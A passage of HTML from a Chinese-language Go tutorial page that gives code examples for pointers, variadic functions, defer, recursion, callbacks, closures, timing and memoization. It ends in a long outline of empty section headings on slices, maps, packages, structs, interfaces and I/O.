class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// this function changes reply:</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Multiply</span><span class="params">(a, b <span class="keyword">int</span>, reply *<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    *reply = a * b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    n := <span class="number">0</span></span><br><span class="line">    reply := &amp;n</span><br><span class="line">    Multiply(<span class="number">10</span>, <span class="number">5</span>, reply)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Multiply:&quot;</span>, *reply) <span class="comment">// Multiply: 50</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="传递变长参数"><a href="#传递变长参数" class="headerlink" title="传递变长参数"></a>传递变长参数</h3><p>如果函数的最后一个参数是采用 <code>...type</code> 的形式，那么这个函数就可以处理一个变长的参数，这个长度可以为 0，这样的函数称为变参函数。</p><p>示例函数和调用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greeting</span><span class="params">(prefix <span class="keyword">string</span>, who ...<span class="keyword">string</span>)</span></span></span><br><span class="line">Greeting(<span class="string">&quot;hello:&quot;</span>, <span class="string">&quot;Joe&quot;</span>, <span class="string">&quot;Anna&quot;</span>, <span class="string">&quot;Eileen&quot;</span>)</span><br></pre></td></tr></table></figure><p>在 Greeting 函数中，变量 <code>who</code> 的值为 <code>[]string&#123;&quot;Joe&quot;, &quot;Anna&quot;, &quot;Eileen&quot;&#125;</code>。</p><p>如果参数被存储在一个数组 <code>arr</code> 中，则可以通过 <code>arr...</code> 的形式来传递参数调用变参函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := Min(<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The minimum is: %d\n&quot;</span>, x) <span class="comment">// 输出：The minimum is: 0</span></span><br><span class="line">    arr := []<span class="keyword">int</span>&#123;<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>&#125;</span><br><span class="line">    x = Min(arr...)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The minimum in the array arr is: %d&quot;</span>, x) <span class="comment">// 输出：The minimum in the array arr is: 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Min</span><span class="params">(a ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    min := a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">        <span class="keyword">if</span> v &lt; min &#123;</span><br><span class="line">            min = v</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="defer-和追踪"><a href="#defer-和追踪" class="headerlink" title="defer 和追踪"></a>defer 和追踪</h3><p><a href="https://www.kancloud.cn/kancloud/the-way-to-go/72476">https://www.kancloud.cn/kancloud/the-way-to-go/72476</a></p><p>关键字 defer 允许我们推迟到函数返回之前（或任意位置执行 <code>return</code> 语句之后）一刻才执行某个语句或函数（为什么要在返回之后才执行这些语句？因为 <code>return</code> 语句同样可以包含一些操作，而不是单纯地返回某个值）。</p><p>关键字 defer 的用法类似于面向对象编程语言 Java 和 C# 的 <code>finally</code> 语句块，它一般用于释放某些已分配的资源。</p><p>当有多个 defer 行为被注册时，它们会以逆序执行（类似栈，即后进先出）</p><p>可以使用 defer 语句实现代码追踪</p><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><table><thead><tr><th align="left">名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">close</td><td align="left">用于管道通信</td></tr><tr><td align="left">len、cap</td><td align="left">len 用于返回某个类型的长度或数量（字符串、数组、切片、map 和管道）；cap 是容量的意思，用于返回某个类型的最大容量（只能用于切片和 map）</td></tr><tr><td align="left">new、make</td><td align="left">new 和 make 均是用于分配内存：new 用于值类型和用户定义的类型，如自定义结构，make 用户内置引用类型（切片、map 和管道）。它们的用法就像是函数，但是将类型作为参数：new(type)、make(type)。new(T) 分配类型 T 的零值并返回其地址，也就是指向类型 T 的指针（详见第 10.1 节）。它也可以被用于基本类型：<code>v := new(int)</code>。make(T) 返回类型 T 的初始化之后的值，因此它比 new 进行更多的工作（详见第 7.2.3/4 节、第 8.1.1 节和第 14.2.1 节）<strong>new() 是一个函数，不要忘记它的括号</strong></td></tr><tr><td align="left">copy、append</td><td align="left">用于复制和连接切片</td></tr><tr><td align="left">panic、recover</td><td align="left">两者均用于错误处理机制</td></tr><tr><td align="left">print、println</td><td align="left">底层打印函数（详见第 4.2 节），在部署环境中建议使用 fmt 包</td></tr><tr><td align="left">complex、real imag</td><td align="left">用于创建和操作复数（详见第 4.5.2.2 节</td></tr></tbody></table><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><p>当一个函数在其函数体内调用自身，则称之为递归。最经典的例子便是计算斐波那契数列，即每个数均为前两个数之和。数列如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>, <span class="number">610</span>, <span class="number">987</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>, <span class="number">10946</span>, …</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    result := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">        result = fibonacci(i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;fibonacci(%d) is: %d\n&quot;</span>, i, result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="params">(res <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span> &#123;</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res = fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">fibonacci(<span class="number">0</span>) is: <span class="number">1</span></span><br><span class="line">fibonacci(<span class="number">1</span>) is: <span class="number">1</span></span><br><span class="line">fibonacci(<span class="number">2</span>) is: <span class="number">2</span></span><br><span class="line">fibonacci(<span class="number">3</span>) is: <span class="number">3</span></span><br><span class="line">fibonacci(<span class="number">4</span>) is: <span class="number">5</span></span><br><span class="line">fibonacci(<span class="number">5</span>) is: <span class="number">8</span></span><br><span class="line">fibonacci(<span class="number">6</span>) is: <span class="number">13</span></span><br><span class="line">fibonacci(<span class="number">7</span>) is: <span class="number">21</span></span><br><span class="line">fibonacci(<span class="number">8</span>) is: <span class="number">34</span></span><br><span class="line">fibonacci(<span class="number">9</span>) is: <span class="number">55</span></span><br><span class="line">fibonacci(<span class="number">10</span>) is: <span class="number">89</span></span><br></pre></td></tr></table></figure><h3 id="将函数作为参数"><a href="#将函数作为参数" class="headerlink" title="将函数作为参数"></a>将函数作为参数</h3><p>函数可以作为其它函数的参数进行传递，然后在其它函数内调用执行，一般称之为回调 <code>callback</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    callback(<span class="number">1</span>, Add)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The sum of %d and %d is: %d\n&quot;</span>, a, b, a+b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">callback</span><span class="params">(y <span class="keyword">int</span>, f <span class="keyword">func</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)</span>)</span> &#123;</span><br><span class="line">    f(y, <span class="number">2</span>) <span class="comment">// this becomes Add(1, 2)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">The sum of <span class="number">1</span> and <span class="number">2</span> is: <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>当我们不希望给函数起名字的时候，可以使用匿名函数，例如：<code>func(x, y int) int &#123; return x + y &#125;</code>。</p><p>这样的一个函数不能够独立存在（编译器会返回错误：<code>non-declaration statement outside function body</code>），但可以被赋值于某个变量，即保存函数的地址到变量中：<code>fplus := func(x, y int) int &#123; return x + y &#125;</code>，然后通过变量名对函数进行调用：<code>fplus(3,4)</code>。</p><p>当然，您也可以直接对匿名函数进行调用：<code>func(x, y int) int &#123; return x + y &#125; (3, 4)</code>。</p><h3 id="应用闭包：将函数作为返回值"><a href="#应用闭包：将函数作为返回值" class="headerlink" title="应用闭包：将函数作为返回值"></a>应用闭包：将函数作为返回值</h3><p><a href="https://www.kancloud.cn/kancloud/the-way-to-go/72481">https://www.kancloud.cn/kancloud/the-way-to-go/72481</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// make an Add2 function, give it a name p2, and call it:</span></span><br><span class="line">    p2 := Add2()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Call Add2 for 3 gives: %v\n&quot;</span>, p2(<span class="number">3</span>))</span><br><span class="line">    <span class="comment">// make a special Adder function, a gets value 3:</span></span><br><span class="line">    TwoAdder := Adder(<span class="number">2</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The result is: %v\n&quot;</span>, TwoAdder(<span class="number">3</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add2</span><span class="params">()</span> <span class="title">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b + <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Adder</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">Call Add2 <span class="keyword">for</span> <span class="number">3</span> gives: <span class="number">5</span></span><br><span class="line">The result is: <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="使用闭包调试"><a href="#使用闭包调试" class="headerlink" title="使用闭包调试"></a>使用闭包调试</h3><p>能够准确地知道哪个文件中的具体哪个函数正在执行，对于调试是十分有帮助的。您可以使用 <code>runtime</code> 或 <code>log</code> 包中的特殊函数来实现这样的功能。包<code>runtime</code> 中的函数 <code>Caller()</code> 提供了相应的信息，因此可以在需要的时候实现一个 <code>where()</code> 闭包函数来打印函数执行的位置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">where := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    _, file, line, _ := runtime.Caller(<span class="number">1</span>)</span><br><span class="line">    log.Printf(<span class="string">&quot;%s:%d&quot;</span>, file, line)</span><br><span class="line">&#125;</span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some more code</span></span><br><span class="line">where()</span><br></pre></td></tr></table></figure><p>您也可以设置 <code>log</code> 包中的 flag 参数来实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log.SetFlags(log.Llongfile)</span><br><span class="line">log.Print(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>或使用一个更加简短版本的 <code>where</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> where = log.Print</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func1</span><span class="params">()</span></span> &#123;</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算函数执行时间"><a href="#计算函数执行时间" class="headerlink" title="计算函数执行时间"></a>计算函数执行时间</h3><p>在计算开始之前设置一个起始时候，再由计算结束时的结束时间，最后取出它们的差值，就是这个计算所消耗的时间。想要实现这样的做法，可以使用 <code>time</code> 包中的 <code>Now()</code> 和 <code>Sub</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start := time.Now()</span><br><span class="line">longCalculation()</span><br><span class="line">end := time.Now()</span><br><span class="line">delta := end.Sub(start)</span><br><span class="line">fmt.Printf(<span class="string">&quot;longCalculation took this amount of time: %s\n&quot;</span>, delta)</span><br></pre></td></tr></table></figure><h3 id="通过内存缓存来提升性能"><a href="#通过内存缓存来提升性能" class="headerlink" title="通过内存缓存来提升性能"></a>通过内存缓存来提升性能</h3><p>进行大量的计算时，提升性能最直接有效的一种方式就是避免重复计算。通过在内存中缓存和重复利用相同计算的结果，称之为内存缓存。最明显的例子就是生成斐波那契数列的程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LIM = <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fibs [LIM]<span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="keyword">uint64</span> = <span class="number">0</span></span><br><span class="line">    start := time.Now()</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; LIM; i++ &#123;</span><br><span class="line">        result = fibonacci(i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;fibonacci(%d) is: %d\n&quot;</span>, i, result)</span><br><span class="line">    &#125;</span><br><span class="line">    end := time.Now()</span><br><span class="line">    delta := end.Sub(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;longCalculation took this amount of time: %s\n&quot;</span>, delta)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="params">(res <span class="keyword">uint64</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// memoization: check if fibonacci(n) is already known in array:</span></span><br><span class="line">    <span class="keyword">if</span> fibs[n] != <span class="number">0</span> &#123;</span><br><span class="line">        res = fibs[n]</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span> &#123;</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res = fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fibs[n] = res</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组与切片"><a href="#数组与切片" class="headerlink" title="数组与切片"></a>数组与切片</h2><h3 id="声明和初始化"><a href="#声明和初始化" class="headerlink" title="声明和初始化"></a>声明和初始化</h3><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><h3 id="For-range-结构"><a href="#For-range-结构" class="headerlink" title="For-range 结构"></a>For-range 结构</h3><h3 id="切片重组（reslice）"><a href="#切片重组（reslice）" class="headerlink" title="切片重组（reslice）"></a>切片重组（reslice）</h3><h3 id="切片的复制与追加"><a href="#切片的复制与追加" class="headerlink" title="切片的复制与追加"></a>切片的复制与追加</h3><h3 id="字符串、数组和切片的应用"><a href="#字符串、数组和切片的应用" class="headerlink" title="字符串、数组和切片的应用"></a>字符串、数组和切片的应用</h3><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="声明、初始化和-make"><a href="#声明、初始化和-make" class="headerlink" title="声明、初始化和 make"></a>声明、初始化和 make</h3><h3 id="测试键值对是否存在及删除元素"><a href="#测试键值对是否存在及删除元素" class="headerlink" title="测试键值对是否存在及删除元素"></a>测试键值对是否存在及删除元素</h3><h3 id="for-range-的配套用法"><a href="#for-range-的配套用法" class="headerlink" title="for-range 的配套用法"></a>for-range 的配套用法</h3><h3 id="map-类型的切片"><a href="#map-类型的切片" class="headerlink" title="map 类型的切片"></a>map 类型的切片</h3><h3 id="map-的排序"><a href="#map-的排序" class="headerlink" title="map 的排序"></a>map 的排序</h3><h3 id="将-map-的键值对调"><a href="#将-map-的键值对调" class="headerlink" title="将 map 的键值对调"></a>将 map 的键值对调</h3><h2 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h2><h3 id="标准库概述"><a href="#标准库概述" class="headerlink" title="标准库概述"></a>标准库概述</h3><h3 id="regexp-包"><a href="#regexp-包" class="headerlink" title="regexp 包"></a>regexp 包</h3><h3 id="锁和-sync-包"><a href="#锁和-sync-包" class="headerlink" title="锁和 sync 包"></a>锁和 sync 包</h3><h3 id="精密计算和-big-包"><a href="#精密计算和-big-包" class="headerlink" title="精密计算和 big 包"></a>精密计算和 big 包</h3><h3 id="自定义包和可见性"><a href="#自定义包和可见性" class="headerlink" title="自定义包和可见性"></a>自定义包和可见性</h3><h3 id="为自定义包使用-godoc"><a href="#为自定义包使用-godoc" class="headerlink" title="为自定义包使用 godoc"></a>为自定义包使用 godoc</h3><h3 id="使用-go-install-安装自定义包"><a href="#使用-go-install-安装自定义包" class="headerlink" title="使用 go install 安装自定义包"></a>使用 go install 安装自定义包</h3><h3 id="自定义包的目录结构、go-install-和-go-test"><a href="#自定义包的目录结构、go-install-和-go-test" class="headerlink" title="自定义包的目录结构、go install 和 go test"></a>自定义包的目录结构、go install 和 go test</h3><h3 id="通过-Git-打包和安装"><a href="#通过-Git-打包和安装" class="headerlink" title="通过 Git 打包和安装"></a>通过 Git 打包和安装</h3><h3 id="Go-的外部包和项目"><a href="#Go-的外部包和项目" class="headerlink" title="Go 的外部包和项目"></a>Go 的外部包和项目</h3><h2 id="结构（struct）与方法（method）"><a href="#结构（struct）与方法（method）" class="headerlink" title="结构（struct）与方法（method）"></a>结构（struct）与方法（method）</h2><h3 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h3><h3 id="使用工厂方法创建结构体实例"><a href="#使用工厂方法创建结构体实例" class="headerlink" title="使用工厂方法创建结构体实例"></a>使用工厂方法创建结构体实例</h3><h3 id="使用自定义包中的结构体"><a href="#使用自定义包中的结构体" class="headerlink" title="使用自定义包中的结构体"></a>使用自定义包中的结构体</h3><h3 id="带标签的结构体"><a href="#带标签的结构体" class="headerlink" title="带标签的结构体"></a>带标签的结构体</h3><h3 id="匿名字段和内嵌结构体"><a href="#匿名字段和内嵌结构体" class="headerlink" title="匿名字段和内嵌结构体"></a>匿名字段和内嵌结构体</h3><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h3 id="垃圾回收和-SetFinalizer"><a href="#垃圾回收和-SetFinalizer" class="headerlink" title="垃圾回收和 SetFinalizer"></a>垃圾回收和 SetFinalizer</h3><h2 id="接口（interface）与反射（reflection）"><a href="#接口（interface）与反射（reflection）" class="headerlink" title="接口（interface）与反射（reflection）"></a>接口（interface）与反射（reflection）</h2><h3 id="接口是什么"><a href="#接口是什么" class="headerlink" title="接口是什么"></a>接口是什么</h3><h3 id="接口嵌套接口"><a href="#接口嵌套接口" class="headerlink" title="接口嵌套接口"></a>接口嵌套接口</h3><h3 id="类型断言：如何检测和转换接口变量的类型"><a href="#类型断言：如何检测和转换接口变量的类型" class="headerlink" title="类型断言：如何检测和转换接口变量的类型"></a>类型断言：如何检测和转换接口变量的类型</h3><h3 id="类型判断：type-switch"><a href="#类型判断：type-switch" class="headerlink" title="类型判断：type-switch"></a>类型判断：type-switch</h3><h3 id="测试一个值是否实现了某个接口"><a href="#测试一个值是否实现了某个接口" class="headerlink" title="测试一个值是否实现了某个接口"></a>测试一个值是否实现了某个接口</h3><h3 id="使用方法集与接口"><a href="#使用方法集与接口" class="headerlink" title="使用方法集与接口"></a>使用方法集与接口</h3><h3 id="第一个例子：使用-Sorter-接口排序"><a href="#第一个例子：使用-Sorter-接口排序" class="headerlink" title="第一个例子：使用 Sorter 接口排序"></a>第一个例子：使用 Sorter 接口排序</h3><h3 id="第二个例子：读和写"><a href="#第二个例子：读和写" class="headerlink" title="第二个例子：读和写"></a>第二个例子：读和写</h3><h3 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h3><h3 id="反射包"><a href="#反射包" class="headerlink" title="反射包"></a>反射包</h3><h1 id="Go-高级编程"><a href="#Go-高级编程" class="headerlink" title="Go 高级编程"></a>Go 高级编程</h1><h2 id="读写数据"><a href="#读写数据" class="headerlink" title="读写数据"></a>读写数据</h2><h3 id="读取用户的输入"><a href="#读取用户的输入" class="headerlink" title="读取用户的输入"></a>读取用户的输入</h3><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><h3 id="从命令行读取参数"><a href="#从命令行读取参数" class="headerlink" title="从命令行读取参数"></a>从命令行读取参数</h3><h3 id="用buffer读取文件"><a href="#用buffer读取文件" class="headerlink" title="用buffer读取文件"></a>用buffer读取文件</h3><h3 id="用切片读写文件"><a href="#用切片读写文件" class="headerlink" title="用切片读写文件"></a>用切片读写文件</h3><h3 id="用-defer-关闭文件"><a href="#用-defer-关闭文件" class="headerlink" title="用 defer 关闭文件"></a>用 defer 关闭文件</h3><h3 id="使用接口的实际例子：fmt-Fprintf"><a href="#使用接口的实际例子：fmt-Fprintf" class="headerlink" title="使用接口的实际例子：fmt.Fprintf"></a>使用接口的实际例子：fmt.Fprintf</h3><h3 id="Json-数据格式"><a href="#Json-数据格式" class="headerlink" title="Json 数据格式"></a>Json 数据格式</h3><h3 id="XML-数据格式"><a href="#XML-数据格式" class="headerlink" title="XML 数据格式"></a>XML 数据格式</h3><h3 id="用-Gob-传输数据"><a href="#用-Gob-传输数据" class="headerlink" title="用 Gob 传输数据"></a>用 Gob 传输数据</h3><h3 id="Go-中的密码学"><a href="#Go-中的密码学" class="headerlink" title="Go 中的密码学"></a>Go 中的密码学</h3><h2 id="错误处理与测试"><a href="#错误处理与测试" class="headerlink" title="错误处理与测试"></a>错误处理与测试</h2><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h3 id="运行时异常和-panic"><a href="#运行时异常和-panic" class="headerlink" title="运行时异常和 panic"></a>运行时异常和 panic</h3><h3 